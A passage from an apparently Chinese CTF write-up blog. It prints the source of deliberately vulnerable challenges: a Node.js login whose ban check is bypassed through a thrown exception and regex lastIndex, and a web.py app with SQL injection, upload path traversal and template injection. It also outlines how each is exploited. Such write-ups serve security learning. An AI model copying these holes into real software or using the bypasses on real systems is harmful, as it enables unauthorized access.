class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">express</span> <span class="operator">=</span> require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">child_process</span> <span class="operator">=</span> require(<span class="string">&#x27;child_process&#x27;</span>)</span><br><span class="line"><span class="type">const</span> <span class="variable">app</span> <span class="operator">=</span> express()</span><br><span class="line">app.use(express.json())</span><br><span class="line"><span class="type">const</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line">function <span class="title function_">escapeRegExp</span><span class="params">(string)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">let</span> <span class="variable">users</span> <span class="operator">=</span> &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    <span class="string">&quot;guest&quot;</span>: <span class="string">&quot;guest&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;hacker&#x27;</span>:<span class="string">&#x27;hacker&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">let</span> <span class="variable">banned_users</span> <span class="operator">=</span> [<span class="string">&#x27;hacker&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你不准getflag</span></span><br><span class="line">banned_users.push(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">let</span> <span class="variable">banned_users_regex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">function <span class="title function_">build_banned_users_regex</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">let</span> <span class="variable">regex_string</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (let username of banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(<span class="number">0</span>, regex_string.length - <span class="number">1</span>)</span><br><span class="line">    banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//鉴权中间件</span></span><br><span class="line">function <span class="title function_">requireLogin</span><span class="params">(req, res, next)</span> &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">password</span> <span class="operator">=</span> req.body.password</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(!username || !password)</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&quot;string&quot;</span> || typeof password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不合法&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test1</span> <span class="operator">=</span> banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test1) &#123;</span><br><span class="line">		console.log(<span class="string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test2</span> <span class="operator">=</span> (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        console.log(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">registerUser</span><span class="params">(username, password)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&quot;string&quot;</span> || username.length &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户名不合法&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof password !== <span class="string">&quot;string&quot;</span> || password.length &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密码不合法&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username in users) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户已存在&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(let existing_user in users)&#123;</span><br><span class="line">        <span class="type">let</span> <span class="variable">existing_user_password</span> <span class="operator">=</span> users[existing_user]</span><br><span class="line">        <span class="keyword">if</span> (existing_user_password === password)&#123;</span><br><span class="line">            <span class="keyword">return</span> `您的密码已经被用户<span class="string">&#x27;$&#123;existing_user&#125;&#x27;</span>使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;注册成功&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.<span class="keyword">static</span>(<span class="string">&#x27;public&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每次请求前，更新封禁用户正则信息</span></span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">		console.log(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/register&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">password</span> <span class="operator">=</span> req.body.password</span><br><span class="line">    <span class="type">let</span> <span class="variable">message</span> <span class="operator">=</span> registerUser(username, password)</span><br><span class="line">    res.send(message)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/login&quot;</span>, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    res.send(<span class="string">&quot;登录成功！&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/flag&quot;</span>, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(username !== <span class="string">&quot;admin&quot;</span>)</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">let</span> <span class="variable">flag</span> <span class="operator">=</span> child_process.execSync(<span class="string">&quot;cat flag&quot;</span>).toString()</span><br><span class="line">    res.end(flag)</span><br><span class="line">    console.error(<span class="string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)</span><br><span class="line">    res.on(<span class="string">&quot;finish&quot;</span>, () =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123; process.exit(<span class="number">0</span>) &#125;, <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/api/ban_user&#x27;</span>, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">ban_username</span> <span class="operator">=</span> req.body.ban_username</span><br><span class="line">    <span class="title function_">if</span><span class="params">(!ban_username)</span>&#123;</span><br><span class="line">        res.send(<span class="string">&quot;ban_username不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(username === ban_username)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;不能封禁自己&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (let name of banned_users)&#123;</span><br><span class="line">        <span class="keyword">if</span> (name === ban_username) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;用户已经被封禁&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    banned_users.push(ban_username)</span><br><span class="line">    res.send(<span class="string">&quot;封禁成功！&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>最主要的逻辑代码是鉴权中间件这块</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//鉴权中间件</span></span><br><span class="line">function <span class="title function_">requireLogin</span><span class="params">(req, res, next)</span> &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">username</span> <span class="operator">=</span> req.body.username</span><br><span class="line">    <span class="type">let</span> <span class="variable">password</span> <span class="operator">=</span> req.body.password</span><br><span class="line">    <span class="title function_">if</span> <span class="params">(!username || !password)</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof username !== <span class="string">&quot;string&quot;</span> || typeof password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        res.send(<span class="string">&quot;用户名或密码不合法&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test1</span> <span class="operator">=</span> banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test1) &#123;</span><br><span class="line">		console.log(<span class="string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">test2</span> <span class="operator">=</span> (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        console.log(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.send(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们想拿到flag 就需要鉴权以admin身份登录 但是每次鉴权之前<code>banned_users.push(&quot;admin&quot;)</code>都会执行这条语句把admin给ban了 无法以admin身份登录</p>
+<p>test1是关于正则的鉴权，来看看正则</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">escapeRegExp</span><span class="params">(string)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">/.../</span><br><span class="line"><span class="type">let</span> <span class="variable">banned_users_regex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">function <span class="title function_">build_banned_users_regex</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">let</span> <span class="variable">regex_string</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (let username of banned_users) &#123;</span><br><span class="line">        regex_string += <span class="string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="string">&quot;$&quot;</span> + <span class="string">&quot;|&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(<span class="number">0</span>, regex_string.length - <span class="number">1</span>)</span><br><span class="line">    banned_users_regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(regex_string, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>遍历封禁用户的数组，以<code>^admin$|^hacker$|</code>的形式，用g全局匹配返回一个正则表达式</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124205087-85881633-48f1-4609-8e34-bfb92bb68ee1.png" alt="img"></p>
+<p>这里有一个trick就是RegExp.lastIndex的使用，当它开启g属性的时候，lastIndex会起作用，它用于表示从哪一个位置开始进行匹配</p>
+<p>有两种情况：</p>
+<ol>
+<li>当regexp.test匹配成功，lastIndex会被设置为最近匹配成功的下一个位置</li>
+<li>当regexp.test匹配失败，lastIndex被设置为0</li>
+</ol>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707121981909-234a9ea1-a03d-4e81-a0a2-522f4dce4a15.png" alt="img"></p>
+<p>那么第一段鉴权：</p>
+<p>每次请求都会通过<code>build_banned_users_regex()</code>生成一个新的正则表达式使得每次匹配都从<code>lastIndex=0</code>开始，如果能够在第一次匹配到admin使得lastIndex索引变成5之后，第二次没有生成新的就匹配，那么就成功绕过了第一层的鉴权，而这里是使用try-catch进行处理的，即使抛出异常，程序也不会中断。所以可以使用其它类型的ban_username，就会抛出TypeError异常，从而不生成新的lastIndex，绕过第一层。</p>
+<p>再来看test2 其实这里<code>in</code>关键字只存在于python </p>
+<p>而在js中的用法：用于检查对象是否具有指定属性或者原型链中是否存在指定的属性</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707122445762-5cb47def-f2d2-4f76-953f-c517b62e3caa.png" alt="img"></p>
+<p>由于 banned_users 为 Array 类型，不存在 admin 属性，因此 test2 实际上判断的是banned_users中是否存在数组索引为username的值（由于对象的属性名称会被隐式转换为字符串，”0”和0都可以作为数组索引）</p>
+<p>现在的问题是每次在请求时都会创建一个新的 <code>banned_users_regex</code> ，恢复其 <code>lastIndex</code> 位置为初始值0</p>
+<p>如果我们能在新的regex对象赋值之前，抛出异常来绕过 regex 的更新，那么就可以了</p>
+<p>传入 <code>escapeRegExp(string)</code> 函数中的 string 参数为非字符串类型</p>
+<p>则string不存在 replace 属性，会抛出TypeError，以此来绕过 regex 的更新</p>
+<p>首先我们注册一个账号然后使用封禁路由</p>
+<p>push一个对象类型，此时就会报错抛异常，bypass lastIndex的重制</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124557396-8dc09cd8-a765-4813-80e4-7d1d5adedc6e.png" alt="img"></p>
+<p>然后用admin登录 第一次会被正则到使得lastIndex为5</p>
+<p>第二次admin登录则不会被正则 此时从第五个字符开始正则</p>
+<p>调试可以观察到：</p>
+<p>这次的<code>banned_users_regex.lastIndex</code>并没有被重制</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707124883100-619e262c-02dd-44cc-8458-51e6173dcee2.png" alt="img"></p>
+<p>第二次登录就会拿到flag</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1707125921213-d9589dd6-2f9a-44e2-83d1-a5061d8aa74b.png" alt="img"></p>
+<h1 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h1><p>环境不太对劲 wpscan扫出来的洞和其他师傅wp不一样 太诡异了 可能是我自己环境搭的有问题。。。</p>
+<p>是phar+文件上传+ssrf的组合拳</p>
+<p>可看X1r0z师傅的官方wp<a target="_blank" rel="noopener" href="https://hackforfun.feishu.cn/wiki/VkHiwiuHziepynkZuGlcp0fEnTd">https://hackforfun.feishu.cn/wiki/VkHiwiuHziepynkZuGlcp0fEnTd</a></p>
+<h1 id="EvilMQ"><a href="#EvilMQ" class="headerlink" title="EvilMQ"></a>EvilMQ</h1><p>先等等</p>
+<h1 id="house-of-click"><a href="#house-of-click" class="headerlink" title="house of click"></a>house of click</h1><p>搭环境这里遇到了问题，有时候<code>docker-compose up -d</code>会报错，拉不到镜像，这里建议换源清华的镜像可以解决这个问题</p>
+<p>这个题就是纯是学习了 压根没见过</p>
+<p>给了源码：</p>
+<p>可以看到是有四个路由的但是进入题目环境之后只有nginx的页面 也访问不到路由</p>
+<p>大致看源码思路就是通过sql注入拿到token，然后再拿着token去文件上传，然后文件上传也有路径穿越因为直接通过os.path.join拼接文件名，穿越到模板文件目录直接访问index进行ssti。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> clickhouse_connect</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;.token&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span> as f:</span><br><span class="line">    TOKEN = f.read()</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;Index&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/query&#x27;</span>, <span class="string">&#x27;Query&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/ping&#x27;</span>, <span class="string">&#x27;Ping&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/token&#x27;</span>, <span class="string">&#x27;Token&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/api/upload&#x27;</span>, <span class="string">&#x27;Upload&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">render = web.template.render(<span class="string">&#x27;templates/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">check_ip</span><span class="params">(ip, ip_range)</span>:</span><br><span class="line">    <span class="keyword">return</span> ipaddress.ip_address(ip) in ipaddress.ip_network(ip_range)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Index</span>:</span><br><span class="line">    def <span class="title function_">GET</span><span class="params">(self)</span>:</span><br><span class="line">        <span class="keyword">return</span> render.index()</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">POST</span><span class="params">(self)</span>:</span><br><span class="line">        data = web.input(name=<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render.__getattr__(data.name)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Query</span>:</span><br><span class="line">    def <span class="title function_">POST</span><span class="params">(self)</span>:</span><br><span class="line">        data = web.input(id=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        client = clickhouse_connect.get_client(host=<span class="string">&#x27;db&#x27;</span>, port=<span class="number">8123</span>, username=<span class="string">&#x27;default&#x27;</span>, password=<span class="string">&#x27;default&#x27;</span>)</span><br><span class="line">        sql = <span class="string">&#x27;SELECT * FROM web.users WHERE id = &#x27;</span> + data.id</span><br><span class="line">        client.command(sql)</span><br><span class="line">        client.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ping</span>:</span><br><span class="line">    def <span class="title function_">GET</span><span class="params">(self)</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;pong&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Token</span>:</span><br><span class="line">    def <span class="title function_">GET</span><span class="params">(self)</span>:</span><br><span class="line">        ip = web.ctx.env.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_">check_ip</span><span class="params">(ip, <span class="string">&#x27;172.28.0.0/16&#x27;</span>)</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;forbidden&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> TOKEN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Upload</span>:</span><br><span class="line">    def <span class="title function_">POST</span><span class="params">(self)</span>:</span><br><span class="line">        ip = web.ctx.env.get(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>)</span><br><span class="line">        token = web.ctx.env.get(<span class="string">&#x27;HTTP_X_ACCESS_TOKEN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> not <span class="title function_">check_ip</span><span class="params">(ip, <span class="string">&#x27;172.28.0.0/16&#x27;</span>)</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;forbidden&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> token != TOKEN:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;unauthorized&#x27;</span></span><br><span class="line">    </span><br><span class="line">        files = web.input(myfile=&#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;myfile&#x27;</span> in files:</span><br><span class="line">            filepath = os.path.join(<span class="string">&#x27;upload/&#x27;</span>, files.myfile.filename)</span><br><span class="line">            <span class="keyword">if</span> (os.path.isfile(filepath)):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            with <span class="title function_">open</span><span class="params">(filepath, <span class="string">&#x27;wb&#x27;</span>)</span> as f:</span><br><span class="line">                f.write(files.myfile.file.read())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line">application = app.wsgifunc(web.httpserver.StaticMiddleware)</span><br></pre></td></tr></table></figure>
+
+<p>根据X1r0z师傅的WP</p>
+<p>思路:</p>
+<ol>
+<li>nginx + gunicorn 路径绕过</li>
+<li>ClickHouse SQL 盲注打 SSRF</li>
+<li>web.py 上传时的目录穿越 + Templetor SSTI 实现 RCE</li>
+</ol>
+<p>首先是nginx + gunicorn 路径绕过</p>
+<p>参考：</p>
